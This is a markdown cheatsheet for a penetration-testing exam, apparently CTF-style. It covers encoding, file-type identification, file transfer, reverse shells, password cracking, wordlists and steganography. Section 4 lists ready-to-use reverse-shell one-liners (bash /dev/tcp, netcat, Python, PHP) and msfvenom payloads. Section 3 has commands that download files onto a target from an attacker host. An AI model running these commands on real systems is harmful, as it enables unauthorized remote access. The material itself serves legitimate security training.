# Quick Utilities — Encoding, Transfers, Shells  
> The small commands you blank on under pressure. Complements [[Exam cheatsheet]] (big tools) and [[Port tool answer]] (port → action).  
  
---  
  
## 1. ENCODING / DECODING  
  
### Base64  
```  
echo "SGVsbG8=" | base64 -d           # decode  
echo "Hello" | base64                  # encode  
base64 -d file.b64 > out.bin           # decode a file  
cat file | base64 -w0                  # encode, no line wraps  
```  
  
### Hex  
```  
echo "48656c6c6f" | xxd -r -p          # hex string -> ascii (decode)  
echo "Hello" | xxd -p                  # ascii -> hex (encode)  
xxd file.bin | less                    # hex dump (view raw bytes / magic number)  
echo "Hello" | od -A x -t x1z          # alternate hex dump  
```  
  
### URL encode / decode  
```  
echo "hello%20world" | python3 -c "import sys,urllib.parse as u;print(u.unquote(sys.stdin.read()))"   # decode  
python3 -c "import urllib.parse as u;print(u.quote('a b&c'))"                                          # encode  
```  
  
### ROT13 / Caesar  
```  
echo "Uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'     # ROT13 (its own inverse)  
```  
  
### Binary / Decimal / ASCII  
```  
echo "01001000" | perl -lpe '$_=pack"B*",$_'  # binary -> ascii  
printf '%d\n' 0x1F                              # hex -> decimal  
printf '0x%x\n' 31                              # decimal -> hex  
man ascii                                       # ASCII table when you need char codes  
```  
  
### CyberChef  
The GUI fallback for any weird/chained encoding. On the exam box: open browser → **gchq.github.io/CyberChef** (allowed, it's offline-capable). "Magic" recipe auto-detects encodings.  
  
---  
  
## 2. FILE / MAGIC-NUMBER IDENTIFICATION  
Often a file has the wrong/no extension and the question is "what type is it?"  
```  
file mystery.bin              # identifies type by magic bytes  
xxd mystery.bin | head        # read the magic number manually  
exiftool mystery.jpg          # metadata, sometimes hidden flags/GPS/author  
binwalk mystery.bin           # find embedded/appended files  
binwalk -e mystery.bin        # extract them  
```  
| Magic (hex) | ASCII | Type |  
|-------------|-------|------|  
| `FF D8 FF` | ÿØÿ | JPEG |  
| `89 50 4E 47` | ‰PNG | PNG |  
| `50 4B 03 04` | PK.. | ZIP / docx / xlsx / jar / apk |  
| `25 50 44 46` | %PDF | PDF |  
| `7F 45 4C 46` | .ELF | Linux executable |  
| `4D 5A` | MZ | Windows EXE/DLL |  
| `52 61 72 21` | Rar! | RAR archive |  
| `1F 8B` | | gzip |  
  
---  
  
## 3. FILE TRANSFER (get a file from/to the target)  
  
### Serve from your attack box  
```  
python3 -m http.server 80              # serve current dir over HTTP  
python3 -m pyftpdlib -p 21             # quick FTP server  
impacket-smbserver share . -smb2support   # quick SMB share named "share"  
```  
  
### Pull onto the target  
```  
# Linux target  
wget http://[attacker-ip]/file -O /tmp/file  
curl http://[attacker-ip]/file -o /tmp/file  
  
# Windows target  
certutil -urlcache -f http://[attacker-ip]/file.exe file.exe  
powershell -c "Invoke-WebRequest http://[attacker-ip]/f.exe -OutFile f.exe"  
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ip/f.exe','f.exe')"  
```  
  
### Netcat transfer (no web server)  
```  
# Receiver:   nc -lvnp 4444 > file  
# Sender:     nc [ip] 4444 < file  
```  
  
---  
  
## 4. REVERSE / BIND SHELLS  
  
### Listener (on your box)  
```  
nc -lvnp 4444                          # catch the shell  
rlwrap nc -lvnp 4444                   # with arrow-key history  
```  
  
### Payloads to run on the target  
```  
# Bash  
bash -i >& /dev/tcp/[ip]/4444 0>&1  
# Netcat (if -e supported)  
nc [ip] 4444 -e /bin/bash  
# Netcat (no -e)  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip] 4444 >/tmp/f  
# Python  
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("[ip]",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'  
# PHP (web shells / LFI)  
php -r '$s=fsockopen("[ip]",4444);exec("/bin/sh -i <&3 >&3 2>&3");'  
```  
  
### Upgrade a dumb shell to a real TTY  
```  
python3 -c 'import pty;pty.spawn("/bin/bash")'  
# then: Ctrl+Z  
stty raw -echo; fg  
# then press Enter twice  
export TERM=xterm  
```  
  
### msfvenom (when you need a payload file) — see [[Exam cheatsheet]] §8  
```  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=4444 -f exe > s.exe  
msfvenom -p php/reverse_php LHOST=[ip] LPORT=4444 -f raw > s.php  
```  
  
---  
  
## 5. CRACKING ARCHIVES & DOCS (the *2john tools)  
Convert a protected file to a hash, then crack with john/hashcat.  
```  
zip2john secret.zip > hash.txt  
rar2john secret.rar > hash.txt  
pdf2john secret.pdf > hash.txt  
office2john secret.docx > hash.txt    # Office docs  
ssh2john id_rsa > hash.txt            # passphrase on SSH key  
  
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  
john --show hash.txt                   # show the cracked password  
```  
Cracking a zip directly:  
```  
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secret.zip  
```  
  
---  
  
## 6. WORDLIST GENERATION  
```  
# Crunch — pattern-based  
crunch 6 6 -t Pass@@ -o list.txt       # 6 chars, "Pass" + 2 lowercase  
crunch 4 8 0123456789 -o pins.txt      # digits only, len 4-8  
  
# Cewl — scrape words from a target website  
cewl http://[ip] -m 5 -w wordlist.txt  # words >=5 chars from the site  
  
# rockyou location  
/usr/share/wordlists/rockyou.txt       # gunzip rockyou.txt.gz first if needed  
```  
  
---  
  
## 7. HASHING & INTEGRITY  
```  
md5sum file        sha1sum file        sha256sum file  
# Compare two files (spot the tampered one):  
sha256sum original suspect             # different digest = modified  
# Verify against a known hash:  
echo "[known_hash]  file" | sha256sum -c -  
```  
Hash type unknown? `hash-identifier` or `hashid '[hash]'` → then look up the mode in [[Exam cheatsheet]] §2.  
  
---  
  
## 8. STEGANOGRAPHY EXTRAS  
(Core steghide/snow/binwalk are in [[Exam cheatsheet]] §6.)  
```  
zsteg image.png                        # PNG/BMP LSB stego (Ruby tool)  
zsteg -a image.png                     # try all methods  
stegseek image.jpg rockyou.txt         # brute-force steghide passphrase (fast)  
steghide info image.jpg                # is anything embedded?  
strings -n 6 file | less               # readable strings, min length 6  
exiftool file                          # metadata comments often hold the flag  
```  
  
---  
  
## 9. MISC QUICK WINS  
```  
macchanger -r eth0                     # random MAC (spoofing tasks)  
searchsploit [product] [version]       # find an exploit for a service/version  
searchsploit -m [id]                   # copy that exploit to current dir  
locate [filename]                      # find a file fast (updatedb if stale)  
grep -rin "password" /path             # recursive case-insensitive search  
watch -n2 'ls -la'                     # re-run a command every 2s  
tee log.txt                            # pipe output to screen AND a file  
```  
  
### Decode common DB / web creds on the fly  
```  
echo -n 'admin:admin' | base64                 # build a Basic-Auth header value  
# Basic auth header in a request: Authorization: Basic YWRtaW46YWRtaW4=  
```  
  
---  
  
## 10. WHEN STUCK — 30-SECOND CHECKLIST  
1. Re-read the question — it usually names the **tool** or the **exact output format** wanted.  
2. `nmap -sV` the host again — did you miss a port / service version?  
3. `searchsploit` the exact service version string.  
4. Default creds: admin/admin, root/toor, admin/password, anonymous (FTP).  
5. Try the cracked password **everywhere** (CME password spray, reuse across hosts).  
6. `strings` / `exiftool` / `binwalk` any file you're given.  
7. Flag format wrong? Strip whitespace, check case, decode if it looks base64/hex.  
